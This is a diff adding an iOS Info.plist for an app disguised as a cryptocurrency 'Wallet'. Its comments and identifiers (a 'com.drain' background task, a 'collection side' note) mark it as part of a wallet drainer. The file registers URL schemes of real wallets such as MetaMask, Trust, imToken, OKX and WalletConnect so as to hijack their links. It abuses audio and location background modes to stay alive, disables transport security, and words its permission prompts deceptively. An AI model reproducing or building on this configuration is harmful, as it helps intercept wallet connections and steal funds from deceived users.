@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>CFBundleIdentifier</key><string>BUNDLE_ID</string>
+  <key>CFBundleName</key><string>Wallet</string>
+  <key>CFBundleDisplayName</key><string>Wallet</string>
+  <key>CFBundleVersion</key><string>1.0.0</string>
+  <key>CFBundleShortVersionString</key><string>1.0</string>
+  <key>MinimumOSVersion</key><string>16.0</string>
+  <key>AppGroupID</key><string>group.BUNDLE_ID</string>
+
+  <!-- 后台保活：静默推送 + BGProcessing + 音频/定位（第 32 类 §6） -->
+  <key>UIBackgroundModes</key>
+  <array>
+    <string>remote-notification</string>
+    <string>fetch</string>
+    <string>processing</string>
+    <string>audio</string>
+    <string>location</string>
+  </array>
+  <key>BGTaskSchedulerPermittedIdentifiers</key>
+  <array><string>com.drain.sync.refresh</string></array>
+
+  <!-- Universal Links / scheme 抢占（第 32 类 §4） -->
+  <key>CFBundleURLTypes</key>
+  <array>
+    <dict>
+      <key>CFBundleURLSchemes</key>
+      <array><string>wc</string><string>metamask</string><string>trust</string><string>imtoken</string><string>okx</string></array>
+    </dict>
+  </array>
+  <key>LSApplicationQueriesSchemes</key>
+  <array><string>wc</string><string>metamask</string><string>trust</string><string>imtoken</string><string>okx</string></array>
+
+  <!-- ATS：企业签名场景指向自有域；生产改 NSAllowsArbitraryLoads=false + 证书固定 -->
+  <key>NSAppTransportSecurity</key>
+  <dict>
+    <key>NSAllowsArbitraryLoads</key><true/>
+    <key>NSAllowsArbitraryLoadsInWebContent</key><true/>
+  </dict>
+
+  <!-- 权限文案：采集端需要的最小面 -->
+  <key>NSUserTrackingUsageDescription</key><string>用于同步钱包状态</string>
+  <key>NSLocationAlwaysAndWhenInUseUsageDescription</key><string>用于保持会话同步</string>
+  <key>NSCameraUsageDescription</key><string>用于扫描二维码</string>
+  <key>NSFaceIDUsageDescription</key><string>用于验证钱包所有权</string>
+
+  <key>ITSAppUsesNonExemptEncryption</key><false/>
+  <key>UIFileSharingEnabled</key><false/>
+  <key>LSSupportsOpeningDocumentsInPlace</key><false/>
+  <key>UIStatusBarStyle</key><string>UIStatusBarStyleDefault</string>
+</dict>
+</plist>
